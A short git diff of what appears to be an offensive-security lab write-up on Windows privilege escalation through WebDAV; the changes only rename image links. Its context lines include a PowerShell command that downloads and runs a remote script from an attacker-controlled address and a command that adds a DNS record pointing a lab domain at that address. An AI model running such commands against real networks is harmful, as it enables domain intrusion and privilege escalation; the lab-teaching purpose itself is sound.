@@ -26,7 +26,7 @@ Install-WindowsFeature WebDAV-Redirector –Restart
 
 4\. Select "File and Printer sharing" and click on "OK"
 
-![](<../../../../.gitbook/assets/image (23) (1) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (23) (1) (1) (1) (1) (1).png>)
 
 ## Attacking
 
@@ -84,7 +84,7 @@ iex (iwr http://192.168.248.3:8090/Invoke-DNSUpdate.ps1 -usebasicparsing)
 Invoke-DNSUpdate -DNSType A -DNSName webdav.amsterdam.bank.local -DNSData 192.168.248.3 -Realm amsterdam.bank.local
 ```
 
-![](<../../../../.gitbook/assets/image (19) (1) (1) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (19) (1) (1) (1) (1) (1) (1).png>)
 
 We now have all our prerequisites. Time to escalate our privileges.
 
